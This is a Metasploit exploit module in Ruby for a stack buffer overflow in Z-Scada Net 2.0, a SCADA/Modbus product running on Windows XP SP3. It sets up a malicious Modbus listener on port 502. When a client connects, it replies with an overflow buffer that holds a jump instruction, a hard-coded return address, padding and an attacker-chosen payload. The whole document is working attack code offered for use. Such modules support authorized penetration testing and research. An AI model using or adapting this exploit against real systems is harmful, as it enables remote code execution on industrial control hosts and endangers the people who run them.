 
class MetasploitModule < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::TcpServer
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;ZScada Net Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a stack based buffer overflow found in
                Z-Scada Net 2.0.  The vulnerability is triggered when parsing
                the response to a Modbus packet.
            },
            &#039;Author&#039;         => [ &#039;james fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;url&#039;, &#039;https://lists.immunityinc.com/pipermail/canvas/2014-December/000141.html&#039; ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 500,
                    &#039;BadChars&#039; => "",
                    &#039;StackAdjustment&#039; => -3500
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Windows XP SP3 EN&#039;, 
                            {
                                # zscadanet.exe v1.0
                                # pop ecx/ pop ebp/ retn
                                &#039;Ret&#039; => 0x00429c35
                            } 
                    ],
                ],
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Dec 11 2014&#039;))
 
        register_options(
            [
                OptPort.new(&#039;SRVPORT&#039;, [ true, "The port to listen on", 502])
            ], self.class)
    end
 
    def on_client_data(client)
        p = payload.encoded
 
        buf = pattern_create(5000)
        buf[574, 4] = [0x909006eb].pack(&#039;V&#039;)    # jmp $+8
        buf[578, 4] = [target.ret].pack(&#039;V&#039;)
        buf[582, 24] = "\x41" * 24
        buf[606, p.length] = p
 
        client.put(buf)
        handler
        service.close_client(client)
    end
 
end

